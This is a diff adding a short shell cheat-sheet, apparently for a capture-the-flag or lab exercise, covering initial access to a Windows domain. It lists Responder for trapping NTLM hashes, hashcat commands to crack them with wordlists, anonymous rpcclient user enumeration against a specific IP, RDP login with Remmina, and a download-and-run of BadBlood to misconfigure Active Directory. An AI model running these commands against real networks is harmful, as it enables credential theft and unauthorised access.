@@ -1,0 +1,35 @@
+# INITIAL ACCESS
+# -----------------------------------------------------------------
+
+# IP SPOOFER - CHANGE OUTBOUND IP ADDRESS, MAY WORK WITH ROUTER IN BETWEEN NETWORKS
+
+# Setup Responder to try to get NTLM hash with a trap, user needs to input \\test in run
+sudo responder -I eth1 -wdv
+
+# GET HASH
+sudo gunzip /usr/share/wordlists/rockyou.txt.gz
+# hashcat -m 5600 -a 0 -o cracked.txt hash.txt /usr/share/wordlists/rockyou.txt
+
+# crackstation.net
+sudo gunzip crackstation.txt.gz
+# hashcat -m 5600 -a 0 -o cracked.txt hash.txt crackstation.txt
+
+# THIS ONE FLOODS wireshark
+# can try rpcclient -U '' -N 100.65.2.51 
+enumdomusers
+
+# RDP CONNECTING
+# -----------------------------------------------------------
+# Once you get username / password
+# Use remmina
+sudo apt install -y remmina remmina-plugin-rdp remmina-plugin-secret remmina-plugin-spice
+remmina
+
+
+# BREAK AD CONFIGURATION - CTF.sh
+# Badblood
+
+Invoke-WebRequest -Uri "https://github.com/davidprowe/BadBlood/archive/refs/heads/master/zip" -OutFile "CTF.zip"
+Expand-Archive -Path "C:\Users\workinman9\Downloads\CTF.zip" -DestinationPath .
+cd Badblood-master
+.\Invoke-BadBlood.ps1
